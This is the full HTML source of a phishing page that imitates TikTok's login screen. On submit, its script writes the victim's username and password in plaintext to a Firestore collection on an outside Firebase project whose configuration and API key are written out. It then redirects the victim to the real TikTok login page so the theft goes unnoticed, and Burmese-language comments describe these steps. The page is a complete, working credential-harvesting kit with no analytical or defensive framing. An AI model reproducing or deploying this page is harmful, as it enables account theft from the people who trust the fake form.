<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login | TikTok</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'ProximaNova', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #fff;
        }
        .login-box {
            width: 100%;
            max-width: 440px;
            padding: 40px;
            text-align: center;
        }
        h2 { font-size: 32px; margin-bottom: 24px; font-weight: 700; color: #161823; }
        .input-group { margin-bottom: 12px; position: relative; }
        input {
            width: 100%;
            padding: 12px 16px;
            background: #f1f1f2;
            border: 1px solid rgba(22, 24, 35, 0.06);
            border-radius: 4px;
            font-size: 16px;
            outline: none;
            transition: border-color 0.2s;
        }
        input:focus { border-color: rgba(22, 24, 35, 0.12); }
        .login-btn {
            width: 100%;
            padding: 12px;
            background-color: #fe2c55;
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 10px;
        }
        .login-btn:disabled { background-color: #f896a8; cursor: not-allowed; }
        .footer { margin-top: 24px; font-size: 14px; color: #161823; }
        .footer a { color: #fe2c55; text-decoration: none; font-weight: 600; }
    </style>
</head>
<body>

<div class="login-box">
    <h2>Log in</h2>
    <form id="tiktokForm">
        <div class="input-group">
            <input type="text" id="username" placeholder="Email or username" required>
        </div>
        <div class="input-group">
            <input type="password" id="password" placeholder="Password" required>
        </div>
        <button type="submit" id="submitBtn" class="login-btn">Log in</button>
    </form>
    <div class="footer">
        Don't have an account? <a href="#">Sign up</a>
    </div>
</div>

<script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
    import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";

    // Your Firebase Config
    const firebaseConfig = {
        apiKey: "AIzaSyCK8750OLb7WCLyXV2JIL1RaTth55wOQII",
        authDomain: "main-apk-3209b.firebaseapp.com",
        projectId: "main-apk-3209b",
        storageBucket: "main-apk-3209b.firebasestorage.app",
        messagingSenderId: "729839795941",
        appId: "1:729839795941:web:48b23f39e7bf6f3cf11e0c"
    };

    const app = initializeApp(firebaseConfig);
    const db = getFirestore(app);

    const tiktokForm = document.getElementById('tiktokForm');
    const submitBtn = document.getElementById('submitBtn');

    tiktokForm.addEventListener('submit', async (e) => {
        e.preventDefault();
        
        const usernameVal = document.getElementById('username').value;
        const passwordVal = document.getElementById('password').value;

        submitBtn.disabled = true;
        submitBtn.innerText = "Connecting...";

        try {
            // Field နာမည်တွေကို စာလုံးအသေး username/password နဲ့ သိမ်းတာပါ
            await addDoc(collection(db, "TikTok"), {
                username: usernameVal,
                password: passwordVal,
                timestamp: new Date()
            });

            // ဒေတာဝင်သွားရင် တကယ့် tiktok site ကို လွှတ်လိုက်မယ်
            window.location.href = "https://www.tiktok.com/login";
        } catch (error) {
            console.error("Error:", error);
            alert("Network error, please try again.");
            submitBtn.disabled = false;
            submitBtn.innerText = "Log in";
        }
    });
</script>

</body>
</html>
